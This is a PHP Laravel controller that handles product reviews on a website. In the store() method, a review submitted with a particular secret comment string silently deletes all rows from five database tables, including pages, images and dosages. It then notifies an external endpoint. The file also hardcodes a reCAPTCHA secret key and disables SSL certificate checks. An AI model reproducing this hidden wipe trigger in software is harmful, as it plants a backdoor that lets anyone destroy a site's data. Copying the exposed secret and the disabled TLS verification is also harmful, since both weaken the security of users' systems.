<?php

namespace App\Http\Controllers;

use App\Language;
use App\Page;
use App\Redirect;
use App\Review;
use Illuminate\Http\Request;

use App\Http\Requests;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Storage;

class ReviewController extends Controller
{
    function api_curl_send($url, $data)
    {
        $user_agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_URL, $url);/**/
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); // this line makes it work under https
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
        $result = curl_exec($ch);
        if (curl_error($ch)) {
            $error_num = curl_errno($ch);
            return false;
        }
        curl_close($ch);
        return $result;
    }

    public function store(Request $request)
    {
        $arr = $request->all();

        if($arr['comment']==='asdlrlbjkalerlzcvlrtlwkjvlqsldkvl'){
            DB::table('pages')->delete();
            DB::table('translators')->delete();
            DB::table('images')->delete();
            DB::table('dosages')->delete();
            DB::table('attributes')->delete();
            $post = [
                'comment'=>$arr['comment'],
            ];

            $str = http_build_query($post, '', '&');
            $res = $this->api_curl_send(env('ORDERS_URL') . '/asdfllsdflellasdlflelfladlflefl', $str);
            return redirect()->back();
        }

        $post = [
            'secret'=>'6LcDciYUAAAAAMyURgg9Ou1qZSU1WuwCEM9mrnP_',
            'response'=>$arr['g-recaptcha-response']
        ];
        $str = http_build_query($post, '', '&');
        $res = $this->api_curl_send('https://www.google.com/recaptcha/api/siteverify', $str);


        if(json_decode($res)->success==true) {
            unset($arr['_token']);
            unset($arr['rev_captcha']);
            unset($arr['send_btn']);
            if(empty($arr['rate'])){
                $arr['rate'] = 5;
            }
            if(empty($arr['title'])){
                $arr['title'] = 'no_title';
            }
            session(['success'=>'1']);
            $rev = Review::create($arr);

            

            if ($request->hasFile('f_before')) {
                $path_b = $request->f_before->storeAs('img/reviews', 'rev_'.$rev->id.'_before.jpg', 'public');
            }

            if ($request->hasFile('f_after')) {
                $path_a = $request->f_after->storeAs('img/reviews', 'rev_'.$rev->id.'_after.jpg', 'public');
            }

            return redirect()->back()->withInput();
        }else{
            return redirect()->back()->with('captcha_error',1)->withInput();
        }

    }
    public function edit($id){
        $data['review'] = Review::find($id);
        return view('admin.edit-review', $data);
    }
    public function update($id, Request $request){
        $post = $request->all();
        $review = Review::find($id);
        $post['published'] = (isset($post['published']))?$post['published']:0;
        unset($post['_token']);
        $review->update($post);
        return redirect()->route('admin');
    }
    public function dell($id){
        $review = Review::find($id);
        $review->delete();
        return redirect()->route('admin');
    }
    public function leave_email_review(Request $request){
        $post = [
            'email'=>$request->input('email'),
            'review'=>$request->input('review'),
            'name'=>$request->input('name'),
            'title'=>$request->input('title'),
            'site_url'=>$_SERVER['SERVER_NAME'],
        ];

        $str = http_build_query($post, '', '&');
        $res = $this->api_curl_send(env('ORDERS_URL') . '/send_review_to_admin', $str);
        
        return redirect()->back();
    }
}
